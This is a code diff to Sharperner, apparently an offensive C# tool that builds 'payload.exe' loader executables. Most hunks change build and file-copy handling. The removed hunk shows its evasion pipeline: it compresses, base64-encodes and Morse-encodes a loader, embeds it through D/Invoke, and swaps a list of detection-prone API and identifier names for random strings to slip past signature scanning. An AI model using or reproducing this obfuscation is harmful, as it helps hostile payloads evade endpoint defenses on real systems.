@@ -333,7 +333,7 @@ namespace Sharperner
         {
             var executablePath = $"\"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\"";
 
-            if(string.IsNullOrEmpty(executablePath) || !executablePath.Contains("MSBuild.exe") || !executablePath.EndsWith(".exe"))
+            if(string.IsNullOrEmpty(executablePath) || !executablePath.Contains("MSBuild.exe"))
             {
                 Console.WriteLine("[!] MSBuild.exe executable not found in path");
                 Environment.Exit(0);
@@ -374,7 +374,8 @@ namespace Sharperner
                 // Go
                 process.Start();
 
-                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                process.WaitForExit();
+
             }
             catch (Exception err)
             {
@@ -747,9 +748,27 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                                         Thread.Sleep(2000);
 
-                                        File.Copy(nativeExecutableBinaryLoaderPath, $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+                                        var currentDirOutputFile = $"{Directory.GetCurrentDirectory()}\\{outputFile}";
 
-                                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                        if (File.Exists(nativeExecutableBinaryLoaderPath))
+                                        {
+                                            File.Copy(nativeExecutableBinaryLoaderPath, currentDirOutputFile, true);
+
+                                            if(File.Exists(currentDirOutputFile))
+                                            {
+                                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                            }
+                                            else
+                                            {
+                                                Console.WriteLine("[!] Failed to copy file");
+                                            }
+
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine($"[!] Fail to compile DInvoke project");
+                                        }
+
                                     }
                                     catch
                                     {
@@ -998,10 +1017,23 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                             Compile.CompileAssembly(cscPath, outputFile, tempFile);
 
-                            Console.WriteLine($"[+] Doing some cleaning...");
                             Thread.Sleep(1000);
 
+                            if (File.Exists(outputFile))
+                            {
+                                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                            }
+                            else
+                            {
+                                Console.WriteLine("[!] Failed to compile code");
+                            }
+
+                            Console.WriteLine($"[+] Doing some cleaning...");
+
                             File.Delete(tempFile);
+
+                            Thread.Sleep(1000);
+
                         }
 
                     }
@@ -1130,65 +1162,21 @@ Sharperner.exe /file:file.txt /out:payload.exe
                                     */
                                 var loaderExecutableFilePath = Path.Combine(parentDir, @"loader\x64\Release\loader.exe");
 
-                                var nativeBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\Program.cs");
-
-                                var nativeExecutableBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\bin\x64\Release\DInvoke.exe");
-
-                                Console.WriteLine("[+] Embedding into .NET using D/Invoke Method. Credits to @SharpSploit");
-
-                                var loaderFileContent = File.ReadAllText(nativeBinaryLoaderPath);
-
-                                var tempLoaderFileContent = loaderFileContent;
-
-                                var rawByteArray = File.ReadAllBytes(loaderExecutableFilePath);
-                                var compByteArray = Compress(rawByteArray);
-                                var b64String = Convert.ToBase64String(compByteArray);
-                                var morsedb64String = MorseForFun.Send(b64String);
-
                                 try
                                 {
-                                    //replace all occurences
-                                    string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
-                                                    "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
-                                                    "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
-                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};
+                                    var currentDirOutputFile = $"{Directory.GetCurrentDirectory()}\\{outputFile}";
 
-                                    foreach (string signature in signatures)
+                                    File.Copy(loaderExecutableFilePath, currentDirOutputFile, true);
+
+                                    if(File.Exists(loaderExecutableFilePath))
                                     {
-                                        string randomWord = GenerateRandomString();
-
-                                        // randomizing in SharpSploit's lib
-                                        foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
-                                        {
-                                            string libFileContent = File.ReadAllText(file);
-                                            loaderFileContent = loaderFileContent.Replace(signature, randomWord);
-                                            libFileContent = libFileContent.Replace(signature, randomWord);
-                                            File.WriteAllText(file, libFileContent);
-
-                                        }
+                                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                    }
+                                    else
+                                    {
+                                        Console.WriteLine($"[!] Fail to generate file");
                                     }
 
-                                    loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);
-
-                                }
-                                catch
-                                {
-                                    Console.WriteLine("[!] Error replacing values");
-                                }
-
-                                try
-                                {
-                                    File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
-
-                                    Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
-
-                                    Thread.Sleep(2000);
-
-                                    File.Copy(loaderExecutableFilePath, $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
-
-                                    File.Copy(nativeExecutableBinaryLoaderPath, $"{Directory.GetCurrentDirectory()}\\INVOKE_{outputFile}", true);
-
-                                    Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                                 }
                                 catch
                                 {
@@ -1197,19 +1185,10 @@ Sharperner.exe /file:file.txt /out:payload.exe
 
                                 Console.WriteLine("[+] Doing some cleaning...");
 
-                                //revert all library files
-                                foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
-                                {
-                                    File.Copy($"{file}.ori", file, true);
-                                }
-
                                 //revert loader
                                 File.WriteAllText(rootFile, temp);
                                 File.Delete(loaderExecutableFilePath);
 
-                                //revert nativeBinaryLoader
-                                File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);
-                                File.Delete(nativeExecutableBinaryLoaderPath);
                                 Thread.Sleep(1000);
                             }
                             catch
